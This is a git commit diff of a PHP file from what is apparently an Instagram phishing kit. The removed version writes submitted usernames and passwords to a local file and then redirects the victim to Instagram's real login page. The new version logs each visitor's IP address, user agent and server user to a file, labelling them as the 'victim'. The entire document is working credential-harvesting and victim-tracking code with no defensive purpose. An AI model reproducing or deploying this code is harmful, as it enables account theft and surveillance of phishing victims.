6aca792c01e7d6f99dc9c043ac393361245e9820
keko01 <hatipyucel@gmail.com>
2019-05-12 01:04:29 +0300

    Update temp.php

--- temp.php
+++ temp.php
@@ -1,13 +1,25 @@
 <?php
-
-	$username	= $_POST['new_password1'];
-	$password 	= $_POST['new_password2'];
-
-	$file	= fopen("information","a");
-	fwrite($file, "Username: " . $username . "\r\n");
-	fwrite($file, "Password: " . $password . "\r\n");
-	fwrite($file, "-----------------------" . "\r\n");
-	fclose($file);
-	header("Location: https://www.instagram.com/accounts/login/");
-
-?>
+if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check if ip is pass from proxy
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$useragent = " User-Agent: " . $browser;
+$user = get_current_user(); 
+$file = 'ip.txt';  //this is the file to which the IP address will be written; name it your way.
+$victim = "Victim Public IP: ";
+$currentuser = "\r\n" . "\r\n" . "Current logged in user: " . $user;
+$fp = fopen($file, 'a');
+fwrite($fp, $victim);
+fwrite($fp, $ipaddress);
+fwrite($fp, $useragent);
+fwrite($fp, $currentuser);
+fclose($fp);
